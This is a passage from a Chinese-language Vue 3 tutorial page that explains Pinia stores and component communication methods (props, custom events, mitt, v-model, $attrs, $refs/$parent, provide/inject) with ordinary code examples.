及其变化</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">talkStore.$subscribe(<span class="function">(<span class="params">mutate,state</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;LoveTalk&#x27;</span>,mutate,state)</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(talkList.<span class="property">value</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="store组合式写法"><a href="#store组合式写法" class="headerlink" title="store组合式写法"></a>store组合式写法</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;nanoid&#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;reactive&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// talkList就是state</span></span><br><span class="line">  <span class="keyword">const</span> talkList = <span class="title function_">reactive</span>(</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;talkList&#x27;</span>) <span class="keyword">as</span> <span class="built_in">string</span>) || []</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// getATalk函数相当于action</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getATalk</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 发请求，下面这行的写法是：连续解构赋值+重命名</span></span><br><span class="line">    <span class="keyword">let</span> &#123;<span class="attr">data</span>:&#123;<span class="attr">content</span>:title&#125;&#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://api.uomg.com/api/rand.qinghua?format=json&#x27;</span>)</span><br><span class="line">    <span class="comment">// 把请求回来的字符串，包装成一个对象</span></span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">id</span>:<span class="title function_">nanoid</span>(),title&#125;</span><br><span class="line">    <span class="comment">// 放到数组中</span></span><br><span class="line">    talkList.<span class="title function_">unshift</span>(obj)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;talkList,getATalk&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h3><p><strong><code>Vue3</code>组件通信和<code>Vue2</code>的区别：</strong></p><ul><li>移出事件总线，使用<code>mitt</code>代替。</li></ul><ul><li><code>vuex</code>换成了<code>pinia</code>。</li><li>把<code>.sync</code>优化到了<code>v-model</code>里面了。</li><li>把<code>$listeners</code>所有的东西，合并到<code>$attrs</code>中了。</li><li><code>$children</code>被砍掉了</li></ul><h4 id="props-1"><a href="#props-1" class="headerlink" title="props"></a>props</h4><p>概述：<code>props</code>是使用频率最高的一种通信方式，常用与 ：<strong>父 ↔ 子</strong>。</p><ul><li>若 <strong>父传子</strong>：属性值是<strong>非函数</strong>。</li><li>若 <strong>子传父</strong>：属性值是<strong>函数</strong>。</li></ul><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件，&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;儿子给的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;Child :car=&quot;car&quot; :getToy=&quot;getToy&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">// 数据</span><br><span class="line">const car = ref(&#x27;奔驰&#x27;)</span><br><span class="line">const toy = ref()</span><br><span class="line">// 方法</span><br><span class="line">function getToy(value:string)&#123;</span><br><span class="line">toy.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">    &lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;父给我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;getToy(toy)&quot;&gt;玩具给父亲&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">const toy = ref(&#x27;奥特曼&#x27;)</span><br><span class="line"></span><br><span class="line">defineProps([&#x27;car&#x27;,&#x27;getToy&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><ol><li>概述：自定义事件常用于：<strong>子 =&gt; 父。</strong></li><li>注意区分好：原生事件、自定义事件。</li></ol><ul><li>原生事件：<ul><li>事件名是特定的（<code>click</code>、<code>mosueenter</code>等等）    </li><li>事件对象<code>$event</code>: 是包含事件相关信息的对象（<code>pageX</code>、<code>pageY</code>、<code>target</code>、<code>keyCode</code>）</li></ul></li><li>自定义事件：<ul><li>事件名是任意名称</li><li><strong style="color:red">事件对象<code>$event</code>: 是调用<code>emit</code>时所提供的数据，可以是任意类型！！！&lt;/strong &gt;</li></ul></li></ul><ol><li><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--在父组件中，给子组件绑定自定义事件：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Child</span> @<span class="attr">send-toy</span>=<span class="string">&quot;toy = $event&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注意区分原生事件与自定义事件中的$event--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;toy = $event&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子组件中，触发事件：</span></span><br><span class="line"><span class="variable language_">this</span>.$emit(<span class="string">&#x27;send-toy&#x27;</span>, 具体数据)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-3-【mitt】"><a href="#6-3-【mitt】" class="headerlink" title="6.3. 【mitt】"></a>6.3. 【mitt】</h2><p>概述：与消息订阅与发布（<code>pubsub</code>）功能类似，可以实现任意组件间通信。</p><p>安装<code>mitt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i mitt</span><br></pre></td></tr></table></figure><p>新建文件：<code>src\utils\emitter.ts</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入mitt </span></span><br><span class="line"><span class="keyword">import</span> mitt <span class="keyword">from</span> <span class="string">&quot;mitt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建emitter</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="title function_">mitt</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  // 绑定事件</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;abc&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;abc事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;xyz&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;xyz事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setInterval(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 触发事件</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;abc&#x27;,666)</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;xyz&#x27;,777)</span></span><br><span class="line"><span class="comment">  &#125;, 1000);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setTimeout(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 清理事件</span></span><br><span class="line"><span class="comment">    emitter.all.clear()</span></span><br><span class="line"><span class="comment">  &#125;, 3000); </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建并暴露mitt</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> emitter</span><br></pre></td></tr></table></figure><p>接收数据的组件中：绑定事件、同时在销毁前解绑事件：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; onUnmounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">emitter.<span class="title function_">on</span>(<span class="string">&#x27;send-toy&#x27;</span>,<span class="function">(<span class="params">value</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;send-toy事件被触发&#x27;</span>,value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">onUnmounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 解绑事件</span></span><br><span class="line">  emitter.<span class="title function_">off</span>(<span class="string">&#x27;send-toy&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>【第三步】：提供数据的组件，在合适的时候触发事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendToy</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 触发事件</span></span><br><span class="line">  emitter.<span class="title function_">emit</span>(<span class="string">&#x27;send-toy&#x27;</span>,toy.<span class="property">value</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意这个重要的内置关系，总线依赖着这个内置关系</strong></p><h2 id="6-4-【v-model】"><a href="#6-4-【v-model】" class="headerlink" title="6.4.【v-model】"></a>6.4.【v-model】</h2><ol><li><p>概述：实现 <strong>父↔子</strong> 之间相互通信。</p></li><li><p>前序知识 —— <code>v-model</code>的本质</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用v-model指令 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;userName&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- v-model的本质是下面这行代码 --&gt;</span><br><span class="line">&lt;input </span><br><span class="line">  type=&quot;text&quot; </span><br><span class="line">  :value=&quot;userName&quot; </span><br><span class="line">  @input=&quot;userName =(&lt;HTMLInputElement&gt;$event.target).value&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li><li><p>组件标签上的<code>v-model</code>的本质：<code>:moldeValue</code> ＋ <code>update:modelValue</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 组件标签上使用v-model指令 --&gt;</span><br><span class="line">&lt;AtguiguInput v-model=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 组件标签上v-model的本质 --&gt;</span><br><span class="line">&lt;AtguiguInput :modelValue=&quot;userName&quot; @update:model-value=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;!--将接收的value值赋给input元素的value属性，目的是：为了呈现数据 --&gt;</span><br><span class="line">&lt;!--给input元素绑定原生input事件，触发input事件时，进而触发update:model-value事件--&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;modelValue&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:model-value&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;modelValue&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = defineEmits([&#x27;update:model-value&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>也可以更换<code>value</code>，例如改成<code>abc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 也可以更换value，例如改成abc--&gt;</span><br><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 上面代码的本质如下 --&gt;</span><br><span class="line">&lt;AtguiguInput :abc=&quot;userName&quot; @update:abc=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;abc&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:abc&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;abc&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = defineEmits([&#x27;update:abc&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果<code>value</code>可以更换，那么就可以在组件标签上多次使用<code>v-model</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot; v-model:xyz=&quot;password&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-5-【-attrs-】"><a href="#6-5-【-attrs-】" class="headerlink" title="6.5.【$attrs 】"></a>6.5.【$attrs 】</h2><ol><li><p>概述：<code>$attrs</code>用于实现<strong>当前组件的父组件</strong>，向<strong>当前组件的子组件</strong>通信（<strong>祖→孙</strong>）。</p></li><li><p>具体说明：<code>$attrs</code>是一个对象，包含所有父组件传入的标签属性。</p><blockquote><p> 注意：<code>$attrs</code>会自动排除<code>props</code>中声明的属性(可以认为声明过的 <code>props</code> 被子组件自己“消费”了)</p></blockquote></li></ol><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">&lt;Child :a=&quot;a&quot; :b=&quot;b&quot; :c=&quot;c&quot; :d=&quot;d&quot; v-bind=&quot;&#123;x:100,y:200&#125;&quot; :updateA=&quot;updateA&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">let a = ref(1)</span><br><span class="line">let b = ref(2)</span><br><span class="line">let c = ref(3)</span><br><span class="line">let d = ref(4)</span><br><span class="line"></span><br><span class="line">function updateA(value)&#123;</span><br><span class="line">a.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">&lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;GrandChild v-bind=&quot;$attrs&quot;/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import GrandChild from &#x27;./GrandChild.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>孙组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">&lt;h3&gt;孙组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;a：&#123;&#123; a &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;b：&#123;&#123; b &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;c：&#123;&#123; c &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;d：&#123;&#123; d &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;x：&#123;&#123; x &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;y：&#123;&#123; y &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;updateA(666)&quot;&gt;点我更新A&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">defineProps([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;updateA&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-6-【-refs、-parent】"><a href="#6-6-【-refs、-parent】" class="headerlink" title="6.6. 【$refs、$parent】"></a>6.6. 【$refs、$parent】</h2><ol><li><p>概述：</p><ul><li><code>$refs</code>用于 ：<strong>父→子。</strong></li><li><code>$parent</code>用于：<strong>子→父。</strong></li></ul></li><li><p>原理如下：</p><p>| 属性      | 说明                                                     |<br>| ————- | ———————————————————————————— |<br>| <code>$refs</code>   | 值为对象，包含所有被<code>ref</code>属性标识的<code>DOM</code>元素或组件实例。 |<br>| <code>$parent</code> | 值为对象，当前组件的父组件实例对象。                     |</p></li></ol><h2 id="6-7-【provide、inject】"><a href="#6-7-【provide、inject】" class="headerlink" title="6.7. 【provide、inject】"></a>6.7. 【provide、inject】</h2><ol><li><p>概述：实现<strong>祖孙组件</strong>直接通信</p></li><li><p>具体使用：</p><ul><li>在祖先组件中通过<code>provide</code>配置向后代组件提供数据</li><li>在后代组件中通过<code>inject</code>配置来声明接收数据</li></ul></li><li><p>具体编码：</p><p>【第一步】父组件中，使用<code>provide</code>提供数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">    &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;button @click=&quot;money += 1&quot;&gt;资产+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;car.price += 1&quot;&gt;汽车价格+1&lt;/button&gt;</span><br><span class="line">    &lt;Child/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">  import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">  import &#123; ref,reactive,provide &#125; from &quot;vue&quot;;</span><br><span class="line">  // 数据</span><br><span class="line">  let money = ref(100)</span><br><span class="line">  let car = reactive(&#123;</span><br><span class="line">    brand:&#x27;奔驰&#x27;,</span><br><span class="line">    price:100</span><br><span class="line">  &#125;)</span><br><span class="line">  // 用于更新money的方法</span><br><span class="line">  function updateMoney(value:number)&#123;</span><br><span class="line">    money.value += value</span><br><span class="line">  &#125;</span><br><span class="line">  // 提供数据</span><br><span class="line">  provide(&#x27;moneyContext&#x27;,&#123;money,updateMoney&#125;)</span><br><span class="line">  provide(&#x27;car&#x27;,car)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意：子组件中不用编写任何东西，是不受到任何打扰的</p></blockquote><p>【第二步】孙组件中使用<code>inject</code>配置项接受数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">    &lt;h3&gt;我是孙组件&lt;/h3&gt;</span><br><span class="line">    &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;button @click=&quot;updateMoney(6)&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">  import &#123; inject &#125; from &#x27;vue&#x27;;</span><br><span class="line">  // 注入数据</span><br><span class="line"> let &#123;money,updateMoney&#125; = inject(&#x27;moneyContext&#x27;,&#123;money:0,updateMoney:(x:number)=&gt;&#123;&#125;&#125;)</span><br><span class="line">  let car = inject(&#x27;car&#x27;)</span><br><span 